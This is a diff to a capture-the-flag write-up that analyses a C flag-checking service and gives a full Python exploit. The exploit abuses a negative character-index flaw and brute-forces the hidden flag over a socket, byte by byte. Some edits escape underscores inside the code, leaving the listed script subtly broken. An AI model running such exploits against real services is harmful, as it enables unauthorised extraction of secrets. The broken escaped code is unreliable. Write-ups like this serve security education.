@@ -70,7 +70,7 @@ int is_flag_correct(char *flag_hex /* the user's guess in hex */) {
 
 ## Analysis
 
-An visual inspection of the source code raised some potential issues, but they
+A visual inspection of the source code raised some potential issues, but they
 were all red herrings. For instance, the rtrim() function increments by 2
 instead of one, but that doesn't buy us anything:
 
@@ -87,7 +87,7 @@ void rtrim(char *str) {
 The challenge prompt says to compile the source with `gcc -std=gnu99 -g`, but
 we added `-Wall and -Wextra` and compiled:
 
-```
+```text
 guess_the_flag_censored.c:51:3: warning: implicit declaration of function ‘bzero’ [-Wimplicit-function-declaration]
    bzero(given_flag, 50);
    ^
@@ -130,12 +130,10 @@ def twos_comp(n):
 # In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)
 def generate_flag():
     s = twos_comp(start)
-    l = []
-    # This loop causes server to copy the hidden flag; instead of expanding hex
-    for i in xrange(44):
-        l += ['0' + chr(s + i)] # Put a zero in the high order nibble
-                                # Place negative offset of this flag char in low-order
-    return l
+    # This request causes server to copy the hidden flag; instead of expanding hex
+    #   - Put a zero in the high order nibble
+    #   - Place negative offset of this flag char in low-order
+    return ['0' + chr(s + i) for i in xrange(44)]
   
 # Format the flag and encode it for the wire
 def encode_flag(f):
@@ -169,67 +167,65 @@ second character, until the last (44th) character is verified. Therefore, the
 problem space is greatly reduced from 16^44 to 16*44; 50 orders of magnitude.
 
 The complete solution is listed below:
-```python
+```text
 #!/usr/bin/env python
 
 import sys, socket
 
-# stack location of flags var, relative to bit_to_hex
+# stack location of flags var, relative to bit\_to\_hex
 start = -59            # For 64-bit machines replace with: -123
 host  = 'wildwildweb.fluxfingers.net'
 port  = 1412
 
 # Python doesn't support chr(-x), so do unsigned -> signed conversion.
-def twos_comp(n):
+def twos\_comp(n):
     return 256 + n
 
 # Generate a flag which exploits the char-index defect. This flag should always
 # work, even though it is an invalid format.
 # In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)
-def generate_flag():
-    s = twos_comp(start)
-    l = []
-    # This loop causes server to copy the hidden flag; instead of expanding hex
-    for i in xrange(44):
-        l += ['0' + chr(s + i)] # Put a zero in the high order nibble
-                                # Place negative offset of this flag char in low-order
-    return l
+def generate\_flag():
+    s = twos\_comp(start)
+    # This request causes server to copy the hidden flag; instead of expanding hex
+    #   - Put a zero in the high order nibble
+    #   - Place negative offset of this flag char in low-order
+    return ['0' + chr(s + i) for i in xrange(44)]
 
 # Format the flag and encode it for the wire
-def encode_flag(f):
+def encode\_flag(f):
     return 'flag{'.encode('hex') + \
            ''.join(f) + \
            '}'.encode('hex') + '\n'
 
 # Were we successful?
-def check_resp(r):
+def check\_resp(r):
     return r.startswith('Yaaaay')
 
 # Were we successful (for the prior request)?
-def check_sock(s):
-    rv = check_resp(s.recv(1024))
+def check\_sock(s):
+    rv = check\_resp(s.recv(1024))
     return rv
 
 # Send a flag to the server
-def send_flag(s, f):
+def send\_flag(s, f):
     # Eat the prompt
     s.recv(1024)
     # Bonvoyage!
-    s.send(encode_flag(f))
+    s.send(encode\_flag(f))
 
 # Connect
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
 s.connect((host, port))
 
 # Eat the MOTD
 print s.recv(1024)
 
 # This flag should work, as long as the offset is correct
-base = generate_flag()
+base = generate\_flag()
 
 print "VERIFYING FLAG OFFSET..."
-send_flag(s, base)
-if check_sock(s):
+send\_flag(s, base)
+if check\_sock(s):
     print "  Success!"
 else:
     print "  Failed!"
@@ -240,28 +236,28 @@ discovered = []
 
 for i in xrange(len(base)):
     mutant = base[:]
-    disc_byte = '??'
+    disc\_byte = '??'
     for j in '0123456789abcdef':
         byte = j.encode('hex')
         mutant[i] = byte
 
-        send_flag(s, mutant)
-        if check_sock(s):
-            disc_byte = byte
+        send\_flag(s, mutant)
+        if check\_sock(s):
+            disc\_byte = byte
             print "%d -> 0x%s" % (i, byte)
             break
-    discovered += disc_byte
+    discovered += disc\_byte
             
 print "VERIFYING FINAL FLAG..."
-send_flag(s, discovered)
-if check_sock(s):
-    print "  Success! The flag is: %s" % encode_flag(discovered)
+send\_flag(s, discovered)
+if check\_sock(s):
+    print "  Success! The flag is: %s" % encode\_flag(discovered)
 else:
     print "  Failed!"
 ```
 
 The result is
-```
+```text
 666c61677b3639373437333661373537
 33373436633639366236353639366537
 34363836353664366637363639363537
